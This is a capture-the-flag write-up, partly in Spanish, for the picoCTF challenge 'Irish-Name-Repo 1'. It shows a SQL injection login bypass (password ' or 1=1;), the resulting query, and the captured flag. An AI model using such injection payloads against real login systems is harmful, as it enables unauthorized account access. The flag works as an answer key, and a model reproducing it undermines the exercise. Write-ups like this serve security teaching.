#  Irish-Name-Repo 1

#### Description
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!

## Hints
### 1
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
### 2
Try to think about how the website verifies your login.

## Solucion
Con el ispector vemos el campo oculto y cambiamos el valor a 1
para poder ver la consulta SQL

admin en el usuario
Y en la contrasenia   ' or 1=1;

username: admin 
password: ' or 1=1;
SQL query: SELECT * FROM users WHERE name='admin ' AND password='' or 1=1;'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_f8adf3fb}